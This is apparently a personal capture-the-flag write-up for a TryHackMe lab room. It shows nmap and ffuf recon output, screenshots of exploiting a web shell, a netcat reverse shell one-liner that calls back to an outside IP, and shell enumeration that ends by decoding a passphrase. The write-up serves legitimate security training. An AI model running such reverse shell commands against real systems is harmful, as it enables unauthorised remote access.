---
title: "U.A. High School"
aliases:
  - "U A High School"
kind: writeup
tags:
  - tryhackme-rooms
  - status/not-started
  - writeup
  - linux
  - challenege
status: "Not started"
difficulty: "Easy"
date: 2026-05-21
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 6f1759b9275182b9868981ff5ef42ef2
---

# U.A. High School

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Recon

### NMAP Scan

```powershell
┌──[kali@Shieldbyte53]─[~]
└─❯ nmap -p- --min-rate 1000 -T4 -Pn -sV 10.49.188.35
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 11:21 +0530
Nmap scan report for 10.49.188.35
Host is up (0.0092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

### Fuzzing Directories

```powershell
┌──[kali@Shieldbyte53]─[~]
└─❯ ffuf -u "http://10.49.188.35/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.156.181/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9ms]
:: Progress: [29999/29999] :: Job [1/1] :: 3703 req/sec :: Duration: [0:00:07] :: Errors: 1 ::

```

### Fuzzing /assests directory

```bash
┌──(exp10i73r㉿kali)-[~]
└─$ ffuf -u "http://10.49.188.35/assets/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.188.35/assets/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 90ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 92ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 92ms]
images                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 92ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 92ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 69ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 76ms]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 116ms]
.phtml                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 113ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 65ms]
.html_var_de            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 78ms]
.html.                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 58ms]
.html.html              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.htm.                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.htmll                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 68ms]
.phps                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
.html.old               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 63ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 61ms]
.html.bak               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 64ms]
.htm.htm                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 74ms]
.html1                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 57ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.html.lck               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 90ms]
.html.printable         [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 90ms]
.htm.lck                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 121ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

## Exploiting Web Shell

![[attachments/TryHackMe Rooms/TryHackMe/U.A. High School/Screenshot_2026-06-04_at_21-14-41.png]]

![[attachments/TryHackMe Rooms/TryHackMe/U.A. High School/Screenshot_2026-06-04_at_21-15-43.png]]

![[attachments/TryHackMe Rooms/TryHackMe/U.A. High School/Screenshot_2026-06-04_at_21-19-59.png]]

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.158.240 4444 >/tmp/f
```

## User Flag

```bash
www-data@ip-10-49-188-35:/var/www/html/assets$ ls /home
deku  ubuntu
www-data@ip-10-49-188-35:/var/www/html/assets$ ls /home/deku
user.txt
www-data@ip-10-49-188-35:/var/www/html/assets$ cat /home/deku/user.txt 
cat: /home/deku/user.txt: Permission denied
www-data@ip-10-49-188-35:/var/www/html/assets$ whoami
www-data

www-data@ip-10-49-188-35:/var/www/html/assets$ ls
images  index.php  styles.css
www-data@ip-10-49-188-35:/var/www/html/assets$ cd ..
www-data@ip-10-49-188-35:/var/www/html$ ls
about.html  admissions.html  assets  contact.html  courses.html  index.html
www-data@ip-10-49-188-35:/var/www/html$ cd ..
www-data@ip-10-49-188-35:/var/www$ ls
Hidden_Content  html
www-data@ip-10-49-188-35:/var/www$ ls -la Hidden_Content/
total 12
drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt                
188-35:/var/www$ cat Hidden_Content/passphrase.txt | base64 -d 
www-data@ip-10-49-188-35:/var/www$ AllmightForEver!!!

```
